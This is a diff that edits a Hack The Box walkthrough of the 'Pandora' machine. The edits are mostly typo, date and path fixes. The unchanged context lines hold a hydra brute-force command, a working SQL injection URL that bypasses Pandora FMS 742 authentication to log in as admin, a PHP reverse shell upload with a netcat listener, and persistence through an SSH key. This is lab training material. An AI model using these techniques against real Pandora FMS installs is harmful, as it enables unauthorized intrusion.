@@ -1,15 +1,15 @@
 ---
 layout: post
 title: Hack The Box Walkthrough - Pandora
-date: 2022-03-26
+date: 2022-05-23
 type: post
 tags:
 - Walkthrough
 - Hacking
 - HackTheBox
 - Easy
-permalink: /2022/03/HTB/Pandora
-img: 2022/03/Pandora/Pandora.png
+permalink: /2022/05/HTB/Pandora
+img: 2022/05/Pandora/Pandora.png
 ---
 
 
@@ -80,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
 
 Only SSH (22) and HTTP (80) ports are opened.
 
-I started [Ferox](https://github.com/epi052/feroxbuster) to scan the web site for hidden files and folder.
+I started [Ferox](https://github.com/epi052/feroxbuster) to scan the website for hidden files and folders.
 
 ```bash
 ehogue@kali:~/Kali/OnlineCTFs/HackTheBox/Pandora$ feroxbuster -u http://panda.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt
@@ -166,15 +166,15 @@ by Ben "epi" Risher 🤓                 ver: 2.5.0
 
 While this was running, I launched Burp and Firefox to navigate to the site.
 
-![Main Site](/assets/images/2022/03/Pandora/MainSite.png "Main Site")
+![Main Site](/assets/images/2022/05/Pandora/MainSite.png "Main Site")
 
 I spent a lot of time going through the site. Looking at the requests and responses in Burp. I went through everything Ferox had found.
 
 There was a contact form at the bottom of the page. 
 
-![Send Us A Message Form](/assets/images/2022/03/Pandora/SendUsAMessage.png "Send Us A Message Form")
+![Send Us A Message Form](/assets/images/2022/05/Pandora/SendUsAMessage.png "Send Us A Message Form")
 
-I tried sending payloads for SQL Injections and Cross Site Scripting (XSS). I could not get anything working. 
+I tried sending payloads for SQL Injections and Cross-Site Scripting (XSS). I could not get anything working. 
 
 I kept enumerating the machine. I tried running Ferox again with different lists. Then I tried scanning for UDP ports. 
 
@@ -378,7 +378,7 @@ daniel@pandora:~$
 
 I was in the machine. But the user's home folder did not contain a flag. There was another user named matt. They had the flag, but daniel was not allowed to read it. 
 
-I looked for ways to get access to the user matt. I stated with the obvious things like looking at files in the home folder, sudo, and crontab.
+I looked for ways to get access to the user matt. I started with the obvious things like looking at files in the home folder, sudo, and crontab.
 
 ```bash
 daniel@pandora:~$ ls -la
@@ -421,7 +421,7 @@ daniel@pandora:~$ ls -la /usr/bin/pandora_backup
 -rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
 ```
 
-The pandora_backup file had it and was own by root. But only matt could execute it. I kept a note about it, but I needed to keep searching for ways to escalate to matt. 
+The pandora_backup file had it and was owned by root. But only matt could execute it. I kept a note about it, but I needed to keep searching for ways to escalate to matt. 
 
 When I looked at the enabled site in Apache, I found a site that was only accessible locally. 
 
@@ -440,7 +440,7 @@ $ cat /etc/apache2/sites-enabled/pandora.conf
 </VirtualHost>
 ```
 
-I opened a SSH tunnel to be able to access the site in my browser. 
+I opened an SSH tunnel to be able to access the site in my browser. 
 
 ```bash
 $ ssh -L 80:localhost:80 daniel@target
@@ -448,9 +448,9 @@ $ ssh -L 80:localhost:80 daniel@target
 
 And then opened `http://localhost/`. I was redirected to `pandora_console`. 
 
-![Pandora FMS](/assets/images/2022/03/Pandora/PandoraFMS.png "Pandora FMS")
+![Pandora FMS](/assets/images/2022/05/Pandora/PandoraFMS.png "Pandora FMS")
 
-[Pandora FMS](https://pandorafms.com/) is a monitoring solution written in PHP. I tried to login with daniel's credentials. But it gave me an error saying the user could only use the API. 
+[Pandora FMS](https://pandorafms.com/) is a monitoring solution written in PHP. I tried to log in with daniel's credentials. But it gave me an error saying the user could only use the API. 
 
 I looked at the code, and I needed a user that was an admin or had the `not_login` flag set to false. 
 
@@ -466,7 +466,7 @@ I looked at the code, and I needed a user that was an admin or had the `not_logi
             $config['auth_error'] = __('User only can use the API.');
 ```
 
-I looked for the database credentials to tried and change daniel's user to admin. But only matt could read the configuration. 
+I looked for the database credentials to try and change daniel's user to admin. But only matt could read the configuration. 
 
 ```bash
 $ ls -la include/config.php 
@@ -494,7 +494,7 @@ $ cat audit.log
 2021-06-17 21:10:44 - matt - Logon - 127.0.0.1 - Logged in
 ```
 
-This gave some potential usernames, so I tried to bruteforce the loging. 
+This gave some potential usernames, so I tried to brute force the loging. 
 
 ```bash
 $ cat users.txt 
@@ -504,19 +504,19 @@ matt
 $ hydra -l users.txt -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t64 -m '/pandora_console/index.php?login=1:nick=^USER^&pass=^PASS^&login_button=Login:incorrect' localhost http-post-form
 ```
 
-I left that run for a while with no success. 
+I left that running for a while with no success. 
 
-I went back looking at the site and saw the version number 742. I tried searching for 'Pandora FMS 742 exploit'. The first result was a [post on vulnerabilities found in Pandora FMS 742](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained). The next one was a [repository with a script exploiting the vulnerabilities](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated). The script exploits an SQL Injection vulnerability in the way sessions are handled in some files to login as the admin user. Then it gets remote code execution by uploading a PHP file that executes commands passed in the `test` parameter and accessing the file. 
+I went back to look at the site and saw version number 742. I tried searching for 'Pandora FMS 742 exploit'. The first result was a [post on vulnerabilities found in Pandora FMS 742](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained). The next one was a [repository with a script exploiting the vulnerabilities](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated). The script exploits an SQL Injection vulnerability in the way sessions are handled in some files to log in as the admin user. Then it gets remote code execution by uploading a PHP file that executes commands passed in the `test` parameter and accessing the file. 
 
 I did the exploit manually to be sure I understood it better. First I navigated to `http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20-`. It gave me a blank page, but when I went back to the index page, I was logged in as admin. 
 
-![Admin Dashboard](/assets/images/2022/03/Pandora/PandoraAdminDashboard.png "Admin Dashboard")
+![Admin Dashboard](/assets/images/2022/05/Pandora/PandoraAdminDashboard.png "Admin Dashboard")
 
 The next step was uploading the PHP reverse shell. I went to the File Manager in Pandora. 
 
-![File Manager Menu](/assets/images/2022/03/Pandora/FileManagerMenu.png "File Manager Menu")
+![File Manager Menu](/assets/images/2022/05/Pandora/FileManagerMenu.png "File Manager Menu")
 
-I first tried to upload an image I had in my Kali VM. The image was uploaded and was then available at http://127.0.0.1/pandora_console/images/mountains.jpg . I then uploaded php-reverse-shell.php, started a netcat listener and accessed the PHP file in my browser. 
+I first tried to upload an image I had in my Kali VM. The image was uploaded and was then available at http://127.0.0.1/pandora_console/images/mountains.jpg . I then uploaded php-reverse-shell.php, started a netcat listener, and accessed the PHP file in my browser. 
 
 ```bash
 $ nc -lvnp 4444
@@ -539,7 +539,7 @@ I was connected as matt, and I had the first flag.
 
 ## Getting root
 
-Now I nedded to get root. But first I wanted to have a better shell. So I copied my public key to the server and reconnected with SSH.
+Now I needed to get root. But first I wanted to have a better shell. So I copied my public key to the server and reconnected with SSH.
 
 ```bash
 $ cd /home/matt
@@ -553,7 +553,7 @@ $ chmod 700 .ssh
 $ chmod 600 .ssh/authorized_keys
 ```
 
-Getting root was simple since I had already found the suid binary earlier. Having the suid bit set meant that when matt executed the binary file, it would run with the owner (root) privileges. So if I could use it start start a shell, it would be a root shell. 
+Getting root was simple since I had already found the suid binary earlier. Having the suid bit set meant that when matt executed the binary file, it would run with the owner (root) privileges. So if I could use it to start a shell, it would be a root shell. 
 
 ```bash
 matt@pandora:~$ ls -la /usr/bin/pandora_backup
